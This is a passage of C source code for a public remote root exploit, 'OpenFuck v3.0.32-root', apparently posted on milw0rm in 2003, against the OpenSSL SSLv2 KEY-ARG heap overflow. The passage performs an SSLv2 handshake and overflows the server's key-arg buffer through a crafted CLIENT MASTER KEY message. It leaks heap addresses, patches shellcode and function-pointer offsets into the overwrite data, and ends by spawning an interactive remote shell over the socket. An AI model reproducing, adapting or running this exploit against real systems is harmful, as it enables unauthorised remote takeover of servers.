	for (i = 0; i &lt; CHALLENGE_LENGTH; i++) {
		ssl-&gt;challenge[i] = (unsigned char) (rand() &gt;&gt; 24);
	}
	memcpy(&amp;buf[33], ssl-&gt;challenge, CHALLENGE_LENGTH);

	send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);
}

/* Get a SERVER HELLO response from the server */
void get_server_hello(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	unsigned char *p, *end;
	int len;
	int server_version, cert_length, cs_length, conn_id_length;
	int found;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf(&quot;Server error: %s\n&quot;, ssl_error(ntohs(*(uint16_t*)&amp;buf[1])));
		exit(1);
	}
	if (len &lt; 11) {
		printf(&quot;get_server_hello: Packet too short (len = %d)\n&quot;, len);
		exit(1);
	}

	p = buf;

	if (*(p++) != SSL2_MT_SERVER_HELLO) {
		printf(&quot;get_server_hello: Expected SSL2 MT SERVER HELLO, got %x\n&quot;, (int)p[-1]);
		exit(1);
	}

	if (*(p++) != 0) {
		printf(&quot;get_server_hello: SESSION-ID-HIT is not 0\n&quot;);
		exit(1);
	}

	if (*(p++) != 1) {
		printf(&quot;get_server_hello: CERTIFICATE-TYPE is not SSL CT X509 CERTIFICATE\n&quot;);
		exit(1);
	}

	n2s(p, server_version);
	if (server_version != 2) {
		printf(&quot;get_server_hello: Unsupported server version %d\n&quot;, server_version);
		exit(1);
	}

	n2s(p, cert_length);
	n2s(p, cs_length);
	n2s(p, conn_id_length);

	if (len != 11 + cert_length + cs_length + conn_id_length) {
		printf(&quot;get_server_hello: Malformed packet size\n&quot;);
		exit(1);
	}

	/* read the server certificate */
	ssl-&gt;x509 = NULL;
	ssl-&gt;x509=d2i_X509(NULL,&amp;p,(long)cert_length);
	if (ssl-&gt;x509 == NULL) {
		printf(&quot;get server hello: Cannot parse x509 certificate\n&quot;);
		exit(1);
	}

	if (cs_length % 3 != 0) {
		printf(&quot;get server hello: CIPHER-SPECS-LENGTH is not a multiple of 3\n&quot;);
		exit(1);
	}

	found = 0;
	for (end=p+cs_length; p &lt; end; p += 3) {
		if ((p[0] == 0x01) &amp;&amp; (p[1] == 0x00) &amp;&amp; (p[2] == 0x80))
			found = 1;	/* SSL CK RC4 128 WITH MD5 */
	}

	if (!found) {
		printf(&quot;get server hello: Remote server does not support 128 bit RC4\n&quot;);
		exit(1);
	}

	if (conn_id_length &gt; SSL2_MAX_CONNECTION_ID_LENGTH) {
		printf(&quot;get server hello: CONNECTION-ID-LENGTH is too long\n&quot;);
		exit(1);
	}

	/* The connection id is sent back to the server in the CLIENT FINISHED packet */
	ssl-&gt;conn_id_length = conn_id_length;
	memcpy(ssl-&gt;conn_id, p, conn_id_length);
}

/* Send a CLIENT MASTER KEY message to the server */

void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {
	int encrypted_key_length, key_arg_length, record_length;
	unsigned char* p;
	int i;
	EVP_PKEY *pkey=NULL;

	unsigned char buf[BUFSIZE] =
		&quot;\x02&quot;			/* client master key message */
		&quot;\x01\x00\x80&quot;	/* cipher kind */
		&quot;\x00\x00&quot;		/* clear key length */
		&quot;\x00\x40&quot;		/* encrypted key length */
		&quot;\x00\x08&quot;;		/* key arg length */

	p = &amp;buf[10];

	/* generate a 128 byte master key */
	for (i = 0; i &lt; RC4_KEY_LENGTH; i++) {
		ssl-&gt;master_key[i] = (unsigned char) (rand() &gt;&gt; 24);
	}

	pkey=X509_get_pubkey(ssl-&gt;x509);
	if (!pkey) {
		printf(&quot;send client master key: No public key in the server certificate\n&quot;);
		exit(1);
	}

	if (pkey-&gt;type != EVP_PKEY_RSA) {
		printf(&quot;send client master key: The public key in the server certificate is not a RSA key\n&quot;);
		exit(1);
	}

	/* Encrypt the client master key with the server public key and put it in the packet */
	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], pkey-&gt;pkey.rsa, RSA_PKCS1_PADDING);
	if (encrypted_key_length &lt;= 0) {
		printf(&quot;send client master key: RSA encryption failure\n&quot;);
		exit(1);
	}

	p += encrypted_key_length;

	if (key_arg_overwrite) {
		/* These 8 bytes fill the key arg array on the server */
		for (i = 0; i &lt; 8; i++) {
			*(p++) = (unsigned char) (rand() &gt;&gt; 24);
		}
		/* This overwrites the data following the key arg array */
		memcpy(p, key_arg_overwrite, key_arg_overwrite_len);

		key_arg_length = 8 + key_arg_overwrite_len;
	}
	else {
		key_arg_length = 0;	/* RC4 doesn't use KEY-ARG */
	}
	p = &amp;buf[6];
	s2n(encrypted_key_length, p);
	s2n(key_arg_length, p);
	record_length = 10 + encrypted_key_length + key_arg_length;
	send_ssl_packet(ssl, buf, record_length);
	ssl-&gt;encrypted = 1;
}
void generate_key_material(ssl_conn* ssl)
{
	unsigned int i;
	MD5_CTX ctx;
	unsigned char *km;
	unsigned char c='0';

	km=ssl-&gt;key_material;
	for (i=0; i&lt;RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {
		MD5_Init(&amp;ctx);

		MD5_Update(&amp;ctx,ssl-&gt;master_key,RC4_KEY_LENGTH);
		MD5_Update(&amp;ctx,&amp;c,1);
		c++;
		MD5_Update(&amp;ctx,ssl-&gt;challenge,CHALLENGE_LENGTH);
		MD5_Update(&amp;ctx,ssl-&gt;conn_id, ssl-&gt;conn_id_length);
		MD5_Final(km,&amp;ctx);
		km+=MD5_DIGEST_LENGTH;
	}
}
void generate_session_keys(ssl_conn* ssl)
{
	generate_key_material(ssl);
	ssl-&gt;read_key = &amp;(ssl-&gt;key_material[0]);
	ssl-&gt;rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl-&gt;rc4_read_key, RC4_KEY_LENGTH, ssl-&gt;read_key);

	ssl-&gt;write_key = &amp;(ssl-&gt;key_material[RC4_KEY_LENGTH]);
	ssl-&gt;rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl-&gt;rc4_write_key, RC4_KEY_LENGTH, ssl-&gt;write_key);
}
void get_server_verify(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf(&quot;Server error: %s\n&quot;, ssl_error(ntohs(*(uint16_t*)&amp;buf[1])));
		exit(1);
	}
	if (len != 1 + CHALLENGE_LENGTH) {
		printf(&quot;get server verify: Malformed packet size\n&quot;);
		exit(1);
	}
	if (buf[0] != SSL2_MT_SERVER_VERIFY) {
		printf(&quot;get server verify: Expected SSL2 MT SERVER VERIFY, got %x\n&quot;, (int)buf[0]);
		exit(1);
	}
	if (memcmp(ssl-&gt;challenge, &amp;buf[1], CHALLENGE_LENGTH)) {
		printf(&quot;get server verify: Challenge strings don't match\n&quot;);
		exit(1);
	}
}
void send_client_finished(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	buf[0] = SSL2_MT_CLIENT_FINISHED;
	memcpy(&amp;buf[1], ssl-&gt;conn_id, ssl-&gt;conn_id_length);
	send_ssl_packet(ssl, buf, 1+ssl-&gt;conn_id_length);
}
void get_server_finished(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;
	int i;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf(&quot;Server error: %s\n&quot;, ssl_error(ntohs(*(uint16_t*)&amp;buf[1])));
		exit(1);
	}
	if (buf[0] != SSL2_MT_SERVER_FINISHED) {
		printf(&quot;get server finished: Expected SSL2 MT SERVER FINISHED, got %x\n&quot;, (int)buf[0]);
		exit(1);
	}

	if (len &lt;= 112 /*17*/) {
		printf(&quot;This server is not vulnerable to this attack.\n&quot;);
		exit(1);
	}
	cipher = *(int*)&amp;buf[101];
	ciphers = *(int*)&amp;buf[109];
	printf(&quot;cipher: 0x%x   ciphers: 0x%x\n&quot;, cipher, ciphers);
}
void get_server_error(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	int len;

	if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) &gt; 0) {
		printf(&quot;get server finished: Expected SSL2 MT ERROR, got %x\n&quot;, (int)buf[0]);
		exit(1);
	}
}
void usage(char* argv0)
{
	int i;
	printf(&quot;: Usage: %s target box [port] [-c N]\n\n&quot;, argv0);
	printf(&quot;  target - supported box eg: 0x00\n&quot;);
	printf(&quot;  box - hostname or IP address\n&quot;);
	printf(&quot;  port - port for ssl connection\n&quot;);
	printf(&quot;  -c open N connections. (use range 40-50 if u dont know)\n&quot;);
	printf(&quot;  \n\n&quot;);
	printf(&quot;  Supported OffSet:\n&quot;);

	for (i=0; i&lt;=MAX_ARCH; i++) {
		printf(&quot;\t0x%02x - %s\n&quot;, i, architectures[i].desc);
	}
	printf(&quot;\nFuck to all guys who like use lamah ddos. Read SRC to have no surprise\n&quot;);

	exit(1);
}
int main(int argc, char* argv[])
{
	char* host;
	int port = 443;
	int i;
	int arch;
	int N = 0;
	ssl_conn* ssl1;
	ssl_conn* ssl2;

	printf(&quot;\n&quot;);
	printf(&quot;*******************************************************************\n&quot;);
	printf(&quot;* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n&quot;);
	printf(&quot;*******************************************************************\n&quot;);
        printf(&quot;* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n&quot;);
        printf(&quot;* #hackarena  irc.brasnet.org                                     *\n&quot;);
	printf(&quot;* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n&quot;);
	printf(&quot;* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n&quot;);
	printf(&quot;* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n&quot;);
	printf(&quot;*******************************************************************\n&quot;);
	printf(&quot;\n&quot;);
	if ((argc &lt; 3) || (argc &gt; 6))
		usage(argv[0]);
	sscanf(argv[1], &quot;0x%x&quot;, &amp;arch);
	if ((arch &lt; 0) || (arch &gt; MAX_ARCH))
		usage(argv[0]);
	host = argv[2];
	if (argc == 4)
		port = atoi(argv[3]);
	else if (argc == 5) {
		if (strcmp(argv[3], &quot;-c&quot;))
			usage(argv[0]);
		N = atoi(argv[4]);
	}
	else if (argc == 6) {
		port = atoi(argv[3]);
		if (strcmp(argv[4], &quot;-c&quot;))
			usage(argv[0]);
		N = atoi(argv[5]);
	}
	srand(0x31337);
	for (i=0; i&lt;N; i++) {
		printf(&quot;\rConnection... %d of %d&quot;, i+1, N);
		fflush(stdout);
		connect_host(host, port);
		usleep(100000);
	}
	if (N) printf(&quot;\n&quot;);
	printf(&quot;Establishing SSL connection\n&quot;);
	ssl1 = ssl_connect_host(host, port);
	ssl2 = ssl_connect_host(host, port);
	send_client_hello(ssl1);
	get_server_hello(ssl1);
	send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);
	generate_session_keys(ssl1);
	get_server_verify(ssl1);
	send_client_finished(ssl1);
	get_server_finished(ssl1);
	printf(&quot;Ready to send shellcode\n&quot;);
	port = get_local_port(ssl2-&gt;sock);
	overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port &amp; 0xff);
	overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port &gt;&gt; 8) &amp; 0xff);
	*(int*)&amp;overwrite_next_chunk[156] = cipher;
	*(int*)&amp;overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
	*(int*)&amp;overwrite_next_chunk[196] = ciphers + 16;	/* shellcode address */
	send_client_hello(ssl2);
	get_server_hello(ssl2);
	send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);
	generate_session_keys(ssl2);
	get_server_verify(ssl2);
	for (i = 0; i &lt; ssl2-&gt;conn_id_length; i++) {
		ssl2-&gt;conn_id[i] = (unsigned char) (rand() &gt;&gt; 24);
	}
	send_client_finished(ssl2);
	get_server_error(ssl2);
	printf(&quot;Spawning shell...\n&quot;);
	sleep(1);
	sh(ssl2-&gt;sock);
	close(ssl2-&gt;sock);
	close(ssl1-&gt;sock);
	return 0;
}
/* spabam: It isn't 0day */

// milw0rm.com [2003-04-04]</pre></html>